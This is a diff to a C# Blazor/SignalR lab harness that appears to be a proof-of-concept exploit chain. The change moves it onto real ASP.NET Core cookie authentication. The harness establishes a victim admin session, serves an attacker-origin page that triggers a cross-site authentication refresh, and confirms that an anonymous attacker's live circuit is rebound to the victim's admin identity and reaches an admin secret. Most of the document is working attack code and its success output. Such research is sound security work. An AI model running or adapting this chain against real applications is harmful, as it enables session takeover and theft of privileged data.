@@ -8,6 +8,7 @@ using System.Text.Encodings.Web;
 using System.Text.Json;
 using System.Text.RegularExpressions;
 using Microsoft.AspNetCore.Authentication;
+using Microsoft.AspNetCore.Authentication.Cookies;
 using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Components.Authorization;
 using Microsoft.AspNetCore.Components.Server.Circuits;
@@ -21,13 +22,23 @@ using BlazorRefreshLab.Components;
 const string BaseUrl = "http://127.0.0.1:5088";
 const string TargetBrowserUrl = "http://target.localtest.me:5088";
 const string AttackerBrowserUrl = "http://attacker.localtest.me:5089";
+const string CookieName = ".AspNetCore.BlazorRefreshLab";
 
 var builder = WebApplication.CreateBuilder(args);
 builder.WebHost.UseUrls("http://127.0.0.1:5088;http://127.0.0.1:5089");
 
 builder.Services
     .AddAuthentication("Lab")
-    .AddScheme<AuthenticationSchemeOptions, LabCookieAuthenticationHandler>("Lab", _ => { });
+    .AddCookie("Lab", options =>
+    {
+        options.Cookie.Name = CookieName;
+        options.Cookie.HttpOnly = true;
+        options.Cookie.SameSite = SameSiteMode.Lax;
+        options.Cookie.SecurePolicy = CookieSecurePolicy.SameAsRequest;
+        options.Cookie.IsEssential = true;
+        options.ExpireTimeSpan = TimeSpan.FromHours(1);
+        options.SlidingExpiration = false;
+    });
 
 builder.Services.AddAuthorization(options =>
 {
@@ -58,9 +69,7 @@ app.Use(async (context, next) =>
     {
         browserObservation.RefreshOrigin = context.Request.Headers.Origin.ToString();
         browserObservation.RefreshSawVictimCookie =
-            string.Equals(context.Request.Cookies["LabAuth"], "browser-victim", StringComparison.Ordinal);
-        browserObservation.RefreshSawAdminRoleCookie =
-            string.Equals(context.Request.Cookies["LabRole"], "Admin", StringComparison.Ordinal);
+            context.Request.Cookies.ContainsKey(CookieName);
     }
 
     await next();
@@ -79,20 +88,25 @@ app.MapHub<ControlHub>("/control", options => options.EnableAuthenticationRefres
 
 app.MapGet("/health", () => Results.Text("OK")).AllowAnonymous();
 
-app.MapGet("/browser-login", (HttpContext context) =>
+app.MapGet("/browser-login", async (HttpContext context) =>
 {
-    var cookieOptions = new CookieOptions
+    var claims = new[]
     {
-        HttpOnly = true,
-        SameSite = SameSiteMode.Lax,
-        Secure = false,
-        Path = "/",
-        MaxAge = TimeSpan.FromHours(1),
-        Expires = DateTimeOffset.UtcNow.AddHours(1),
+        new Claim(ClaimTypes.Name, "browser-victim"),
+        new Claim(ClaimTypes.NameIdentifier, "browser-victim"),
+        new Claim("sub", "browser-victim"),
+        new Claim(ClaimTypes.Role, "Admin"),
     };
 
-    context.Response.Cookies.Append("LabAuth", "browser-victim", cookieOptions);
-    context.Response.Cookies.Append("LabRole", "Admin", cookieOptions);
+    var principal = new ClaimsPrincipal(new ClaimsIdentity(claims, "Lab"));
+    await context.SignInAsync(
+        "Lab",
+        principal,
+        new AuthenticationProperties
+        {
+            IsPersistent = true,
+            ExpiresUtc = DateTimeOffset.UtcNow.AddHours(1),
+        });
 
     return Results.Content(
         "<!doctype html><title>victim admin session established</title><p>victim admin session established</p>",
@@ -102,8 +116,7 @@ app.MapGet("/browser-login", (HttpContext context) =>
 app.MapGet("/attack", (HttpContext context) =>
 {
     browserObservation.AttackPageSawVictimCookie =
-        string.Equals(context.Request.Cookies["LabAuth"], "browser-victim", StringComparison.Ordinal)
-        || string.Equals(context.Request.Cookies["LabRole"], "Admin", StringComparison.Ordinal);
+        context.Request.Cookies.ContainsKey(CookieName);
 
     var token = context.Request.Query["token"].ToString();
     if (string.IsNullOrWhiteSpace(token))
@@ -231,20 +244,23 @@ try
         throw new InvalidOperationException("Failed to capture control token.");
     }
 
-    using var manualVictimClient = new HttpClient(new HttpClientHandler
+    var manualVictimCookies = new CookieContainer();
+    using var manualVictimHandler = new HttpClientHandler
     {
-        UseCookies = false,
+        CookieContainer = manualVictimCookies,
+        UseCookies = true,
         AllowAutoRedirect = false,
-    });
+    };
+    using var manualVictimClient = new HttpClient(manualVictimHandler);
 
-    using var normalControlRefresh = new HttpRequestMessage(
-        HttpMethod.Post,
-        BaseUrl + "/control/refresh?id=" + Uri.EscapeDataString(controlToken));
-    normalControlRefresh.Headers.TryAddWithoutValidation(
-        "Cookie",
-        "LabAuth=browser-victim; LabRole=Admin");
+    using (var signInResponse = await manualVictimClient.GetAsync(BaseUrl + "/browser-login"))
+    {
+        signInResponse.EnsureSuccessStatusCode();
+    }
 
-    using var normalControlResponse = await manualVictimClient.SendAsync(normalControlRefresh);
+    using var normalControlResponse = await manualVictimClient.PostAsync(
+        BaseUrl + "/control/refresh?id=" + Uri.EscapeDataString(controlToken),
+        new StringContent(""));
     var normalControlBody = await normalControlResponse.Content.ReadAsStringAsync();
 
     Console.WriteLine($"NORMAL_SIGNALR_CROSS_USER_REFRESH_STATUS={(int)normalControlResponse.StatusCode}");
@@ -297,8 +313,7 @@ try
 
     Console.WriteLine($"ATTACK_PAGE_SAW_TARGET_COOKIE={browserObservation.AttackPageSawVictimCookie}");
     Console.WriteLine($"REFRESH_ORIGIN={browserObservation.RefreshOrigin}");
-    Console.WriteLine($"REFRESH_SAW_VICTIM_COOKIE={browserObservation.RefreshSawVictimCookie}");
-    Console.WriteLine($"REFRESH_SAW_ADMIN_COOKIE={browserObservation.RefreshSawAdminRoleCookie}");
+    Console.WriteLine($"REFRESH_SAW_REAL_AUTH_COOKIE={browserObservation.RefreshSawVictimCookie}");
     Console.WriteLine($"REFRESH_STATUS={browserObservation.RefreshStatusCode}");
     Console.WriteLine($"ATTACKER_CONNECTION_AFTER_REBIND={attackerConnection.State}");
 
@@ -308,7 +323,6 @@ try
     }
 
     if (!browserObservation.RefreshSawVictimCookie
-        || !browserObservation.RefreshSawAdminRoleCookie
         || browserObservation.RefreshStatusCode != StatusCodes.Status200OK
         || !string.Equals(browserObservation.RefreshOrigin, AttackerBrowserUrl, StringComparison.Ordinal))
     {
@@ -320,7 +334,7 @@ try
         throw new InvalidOperationException("Anonymous attacker lost their live Blazor connection after victim rebind.");
     }
 
-    Console.WriteLine("REMOTE_ANONYMOUS_ATTACKER_REBOUND_TO_VICTIM_ADMIN=CONFIRMED");
+    Console.WriteLine("REAL_COOKIEAUTH_REMOTE_ANONYMOUS_ATTACKER_REBOUND_TO_VICTIM_ADMIN=CONFIRMED");
     Console.WriteLine("SAMESITE_LAX_BROWSER_DELIVERY=CONFIRMED");
     Console.WriteLine("ATTACKER_CONNECTION_REMAINS_CONNECTED=CONFIRMED");
 
@@ -357,6 +371,7 @@ try
     Console.WriteLine("AUTHORIZED_ADMIN_ROUTE_EXECUTED_ON_ATTACKER_CONNECTION=CONFIRMED");
     Console.WriteLine("VICTIM_ADMIN_SECRET_REACHED_ATTACKER_OWNED_CIRCUIT=CONFIRMED");
     Console.WriteLine("REMOTE_ANONYMOUS_TO_VICTIM_ADMIN_AUTHORIZATION_CONTEXT_TAKEOVER=CONFIRMED");
+    Console.WriteLine("REAL_ASPNETCORE_COOKIEAUTH_CRITICAL_CHAIN=PASS");
     Console.WriteLine("CRITICAL_SEVERITY_CHAIN_EVIDENCE=PASS");
 }
 finally
@@ -440,65 +455,6 @@ static async Task<(int ExitCode, string StdOut, string StdErr)> RunChromeAsync(
     return (process.ExitCode, await stdoutTask, await stderrTask);
 }
 
-sealed class LabCookieAuthenticationHandler : AuthenticationHandler<AuthenticationSchemeOptions>
-{
-    public LabCookieAuthenticationHandler(
-        IOptionsMonitor<AuthenticationSchemeOptions> options,
-        ILoggerFactory logger,
-        UrlEncoder encoder)
-        : base(options, logger, encoder)
-    {
-    }
-
-    protected override Task<AuthenticateResult> HandleAuthenticateAsync()
-    {
-        var cookie = Request.Headers.Cookie.ToString();
-        var parts = cookie.Split(
-            ';',
-            StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
-
-        var authPart = parts.FirstOrDefault(
-            x => x.StartsWith("LabAuth=", StringComparison.Ordinal));
-
-        if (authPart is null)
-        {
-            return Task.FromResult(AuthenticateResult.NoResult());
-        }
-
-        var user = authPart["LabAuth=".Length..];
-        if (string.IsNullOrWhiteSpace(user))
-        {
-            return Task.FromResult(AuthenticateResult.NoResult());
-        }
-
-        var claims = new List<Claim>
-        {
-            new(ClaimTypes.Name, user),
-            new(ClaimTypes.NameIdentifier, user),
-            new("sub", user),
-        };
-
-        var rolePart = parts.FirstOrDefault(
-            x => x.StartsWith("LabRole=", StringComparison.Ordinal));
-
-        if (rolePart is not null)
-        {
-            var role = rolePart["LabRole=".Length..];
-            if (!string.IsNullOrWhiteSpace(role))
-            {
-                claims.Add(new Claim(ClaimTypes.Role, role));
-            }
-        }
-
-        var identity = new ClaimsIdentity(claims, Scheme.Name);
-        return Task.FromResult(
-            AuthenticateResult.Success(
-                new AuthenticationTicket(
-                    new ClaimsPrincipal(identity),
-                    Scheme.Name)));
-    }
-}
-
 sealed class ObservedCircuitIdentityStore
 {
     private readonly ConcurrentQueue<string> _events = new();
@@ -571,7 +527,6 @@ sealed class BrowserCsrfObservation
     public bool AttackPageSawVictimCookie { get; set; }
     public string RefreshOrigin { get; set; } = string.Empty;
     public bool RefreshSawVictimCookie { get; set; }
-    public bool RefreshSawAdminRoleCookie { get; set; }
     public int RefreshStatusCode { get; set; }
 }
 
